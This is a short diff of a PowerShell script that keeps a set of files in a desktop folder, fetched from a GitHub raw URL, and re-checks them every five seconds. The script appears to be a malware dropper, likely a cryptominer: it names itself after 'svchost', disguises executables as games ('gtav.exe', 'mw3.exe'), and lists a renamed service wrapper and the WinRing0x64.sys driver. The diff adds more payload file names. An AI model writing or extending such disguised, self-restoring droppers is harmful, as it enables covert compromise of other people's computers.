@@ -4,7 +4,7 @@ param(
 
 $TargetFolder = "$env:USERPROFILE\Desktop\SystemData"
 $ServiceName = "svchost"
-$FilesToCheck = @("mw3.exe","gnssm.exe","WinRing0x64.sys")
+$FilesToCheck = @("gtav.exe","gnssm.exe","WinRing0x64.sys","config.json","sha32.dll","uv.dll")
 $GitHubBase = "https://raw.githubusercontent.com/HeySinker/bsbs/main/"
 
 # --- Logging ---
@@ -51,3 +51,4 @@ while ($true) {
     Ensure-FilesExist -Files $FilesToCheck -Folder $TargetFolder
     Start-Sleep -Seconds 5
 }
+
